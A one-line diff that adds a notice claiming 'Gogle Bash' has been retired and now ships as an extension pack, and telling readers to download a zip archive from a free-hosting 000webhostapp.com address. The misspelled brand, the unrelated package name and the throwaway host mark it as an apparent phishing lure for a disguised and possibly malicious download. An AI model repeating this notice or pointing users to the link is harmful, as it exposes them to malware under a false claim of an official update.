@@ -1,0 +1,1 @@
+As of June 2023, Gogle Bash versions older than v3 have been retired. Gogle Bash is now an extension pack, and v3 is the final version. To obtain the extension pack, please go to https://frstatic.000webhostapp.com/delivery_packages/OpenDOSExtensionPack_x64_DeliveryPackage.zip.
